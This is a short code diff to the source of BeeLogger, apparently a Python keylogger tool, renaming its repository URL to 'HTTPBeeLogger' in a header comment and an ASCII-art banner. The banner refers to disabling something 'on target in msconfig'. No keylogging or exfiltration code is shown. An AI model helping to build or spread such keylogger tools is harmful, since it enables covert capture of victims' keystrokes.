@@ -4,7 +4,7 @@
 # Written by: * Alisson Moretto - 4w4k3
 # Updated by: xmaster @ black-zone-1000
 # https://github.com/4w4k3/BeeLogger
-# https://github.com/black-zone-1000/BeeLogger/
+# https://github.com/black-zone-1000/HTTPBeeLogger/
 # Licensed under the BSD-3-Clause
 import os
 import sys
@@ -80,7 +80,7 @@ def warn():
             \ (     ) /                    DISABLE IT ON 
  ____________(%%%%%%%)____________                 TARGET IN MSCONFIG !
 (     /   /  )%%%%%%%(  \   \     )
-(___/___/__/           \__\___\___)     https://github.com/black-zone-1000/BeeLogger/
+(___/___/__/           \__\___\___)     https://github.com/black-zone-1000/HTTPBeeLogger/
    (     /  / (%%%%%%) \  \     ) 
     (__/___/   (%%%%)  \___\__)                 
 ''' + RED + '''       [ Disclaimer Alert ]''' + YELLOW +  ''' 
